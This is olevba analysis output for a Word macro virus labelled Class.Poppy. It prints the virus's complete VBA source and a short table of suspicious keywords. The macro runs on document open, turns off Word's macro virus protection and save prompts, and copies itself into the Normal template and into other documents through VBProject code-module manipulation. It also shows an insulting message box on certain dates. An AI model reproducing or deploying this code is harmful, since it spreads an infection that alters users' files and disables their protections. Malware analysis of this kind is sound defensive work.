olevba 0.60.1.dev6 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.fm-b288d66e3ac421ce08f39a16da7010469f5a445f
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.fm-b288d66e3ac421ce08f39a16da7010469f5a445f - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
'Polizia di Stato29/04/2003 3.16.25Canon  BJC-250 on LPT1:Avvicendamento personale
On Error GoTo out
'Polizia di Stato29/04/2003 3.16.26Canon  BJC-250 on LPT1:Avvicendamento personale
Options.VirusProtection = False
'Polizia di Stato29/04/2003 3.16.26Canon  BJC-250 on LPT1:Avvicendamento personale
Options.SaveNormalPrompt = False
'Polizia di Stato29/04/2003 3.16.26Canon  BJC-250 on LPT1:Avvicendamento personale
Options.ConfirmConversions = False
'Polizia di Stato29/04/2003 3.16.26Canon  BJC-250 on LPT1:Avvicendamento personale
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Polizia di Stato29/04/2003 3.16.26Canon  BJC-250 on LPT1:Avvicendamento personale
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Polizia di Stato29/04/2003 3.16.26Canon  BJC-250 on LPT1:Avvicendamento personale
If nt > 70 And ad > 0 Then GoTo out
'Polizia di Stato29/04/2003 3.16.26Canon  BJC-250 on LPT1:Avvicendamento personale
If nt < 70 Then
'Polizia di Stato29/04/2003 3.16.26Canon  BJC-250 on LPT1:Avvicendamento personale
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'Polizia di Stato29/04/2003 3.16.26Canon  BJC-250 on LPT1:Avvicendamento personale
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'Polizia di Stato29/04/2003 3.16.26Canon  BJC-250 on LPT1:Avvicendamento personale
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'Polizia di Stato29/04/2003 3.16.26Canon  BJC-250 on LPT1:Avvicendamento personale
End If
'Polizia di Stato29/04/2003 3.16.26Canon  BJC-250 on LPT1:Avvicendamento personale
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'Polizia di Stato29/04/2003 3.16.26Canon  BJC-250 on LPT1:Avvicendamento personale
If Day(Now) = 14 And (Month(Now) > 5) Then MsgBox "I Think " & Application.UserName & " is a big stupid jerk!", 0, "VicodinES Loves You / Class.Poppy"
'Polizia di Stato29/04/2003 3.16.26Canon  BJC-250 on LPT1:Avvicendamento personale
host.codemodule.AddFromFile ("c:\class.sys")
'Polizia di Stato29/04/2003 3.16.26Canon  BJC-250 on LPT1:Avvicendamento personale
With host.codemodule
'Polizia di Stato29/04/2003 3.16.26Canon  BJC-250 on LPT1:Avvicendamento personale
    For x = 1 To 4
'Polizia di Stato29/04/2003 3.16.26Canon  BJC-250 on LPT1:Avvicendamento personale
    .deletelines 1
'Polizia di Stato29/04/2003 3.16.26Canon  BJC-250 on LPT1:Avvicendamento personale
    Next x
'Polizia di Stato29/04/2003 3.16.26Canon  BJC-250 on LPT1:Avvicendamento personale
End With
'Polizia di Stato29/04/2003 3.16.26Canon  BJC-250 on LPT1:Avvicendamento personale
If nt < 70 Then
'Polizia di Stato29/04/2003 3.16.26Canon  BJC-250 on LPT1:Avvicendamento personale
    With host.codemodule
'Polizia di Stato29/04/2003 3.16.26Canon  BJC-250 on LPT1:Avvicendamento personale
    .replaceline 1, "Sub AutoClose()"
'Polizia di Stato29/04/2003 3.16.26Canon  BJC-250 on LPT1:Avvicendamento personale
    .replaceline 71, "Sub ToolsMacro()"
'Polizia di Stato29/04/2003 3.16.26Canon  BJC-250 on LPT1:Avvicendamento personale
    End With
'Polizia di Stato29/04/2003 3.16.26Canon  BJC-250 on LPT1:Avvicendamento personale
End If
'Polizia di Stato29/04/2003 3.16.26Canon  BJC-250 on LPT1:Avvicendamento personale
With host.codemodule
'Polizia di Stato29/04/2003 3.16.26Canon  BJC-250 on LPT1:Avvicendamento personale
    For x = 2 To 72 Step 2
'Polizia di Stato29/04/2003 3.16.26Canon  BJC-250 on LPT1:Avvicendamento personale
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow
'Polizia di Stato29/04/2003 3.16.26Canon  BJC-250 on LPT1:Avvicendamento personale
    Next x
'Polizia di Stato29/04/2003 3.16.26Canon  BJC-250 on LPT1:Avvicendamento personale
End With
'Polizia di Stato29/04/2003 3.16.26Canon  BJC-250 on LPT1:Avvicendamento personale
out:
'Polizia di Stato29/04/2003 3.16.26Canon  BJC-250 on LPT1:Avvicendamento personale
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'Polizia di Stato29/04/2003 3.16.26Canon  BJC-250 on LPT1:Avvicendamento personale
End Sub
'Polizia di Stato29/04/2003 3.16.26Canon  BJC-250 on LPT1:Avvicendamento personale
Sub ViewVBCode()
'Polizia di Stato29/04/2003 3.16.26Canon  BJC-250 on LPT1:Avvicendamento personale
End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

